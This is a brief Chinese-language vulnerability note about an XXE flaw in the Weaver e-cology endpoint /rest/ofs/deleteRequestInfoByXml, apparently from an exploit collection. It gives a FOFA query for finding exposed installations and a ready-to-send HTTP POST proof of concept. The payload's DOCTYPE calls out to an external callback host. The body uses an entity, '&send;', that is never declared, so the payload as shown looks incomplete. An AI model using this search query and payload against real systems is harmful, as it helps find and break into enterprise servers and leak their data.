# 泛微E-Cology系统接口deleteRequestInfoByXml存在XXE漏洞

泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology系统接口`/rest/ofs/deleteRequestInfoByXml` 存在XXE漏洞

## fofa

```java
app="泛微-协同商务系统"
```

## poc

```java
POST /rest/ofs/deleteRequestInfoByXml HTTP/1.1
Host: 
Content-Type: application/xml
Content-Length: 131

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://hsdtcwwetk.dgrh3.cn">
<M><syscode>&send;</syscode></M>
```

